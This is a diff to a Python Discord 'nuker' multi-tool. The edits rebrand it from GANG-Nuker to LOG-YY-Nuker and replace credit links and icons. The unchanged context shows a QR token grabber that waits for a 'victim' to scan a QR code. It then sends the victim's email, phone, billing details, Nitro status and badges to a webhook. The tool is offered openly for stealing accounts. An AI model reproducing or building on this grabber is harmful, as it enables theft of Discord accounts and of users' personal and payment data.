@@ -1,4 +1,4 @@
-# Developper : waltta#6821 | 
+# Developper : waltta#6821 | https://github.com/waltta/LOG-YY-Nuker-Discord
 # LOG-YY Discord Nuker / Multi Tool©
 # Copyright © 2022 waltta#6821 
 # Copyright © LOG-YY-Nuke
@@ -116,7 +116,7 @@ def QR_Grabber(Webhook):
     print(f'[\x1b[95m>\x1b[95m\x1B[37m] Wait for victim to scan the QR Code...')
     os.system(f'start {os.path.realpath(os.getcwd()+"/QR-Code")}')
     if sys.argv[0].endswith(".exe"):
-        print(f'\n[\x1b[95m>\x1b[95m\x1B[37m] Opening Another GANG-Nuker File')
+        print(f'\n[\x1b[95m>\x1b[95m\x1B[37m] Opening Another LOGYY-Nuker File')
         try:
             os.startfile(sys.argv[0])
         except Exception:
@@ -169,9 +169,9 @@ def QR_Grabber(Webhook):
                 "embeds": [
                     {
                         "author": {
-                            "name": "GANG-Nuker | QR Token Grabber",
-                            "url": "https://github.com/TT-Tutorials/GANG-Nuker",
-                            "icon_url": "https://cdn.discordapp.com/attachments/982965691093254154/994193135213228092/GANGGRABBER.gif"
+                            "name": "LOGYY-Nuker | QR Token Grabber",
+                            "url": "https://github.com/waltta/LOG-YY-Nuker-Discord",
+                            "icon_url": "https://cdn.discordapp.com/attachments/987095218920755232/1003976624175337492/LOG-YY-Nuker_ICON.png"
                         },
                         "description": f"**{user}** Just Scanned the QR Code!\n**[Avatar]({url})**\n\n**Email:** {email}\n**Phone:** {phone}\n**Billing:** {billing}\n**Nitro:** {has_nitro}\n**Badges:** {badges}",
                         "fields": [
@@ -184,7 +184,7 @@ def QR_Grabber(Webhook):
                         "color": 12208895,
 
                         "footer": {
-                          "text": "https://github.com/TT-Tutorials  |  https://github.com/TT-Tutorials/GANG-Nuker"
+                          "text": "https://github.com/waltta/LOG-YY-Nuker-Discord"
                         }
                     }
                 ]
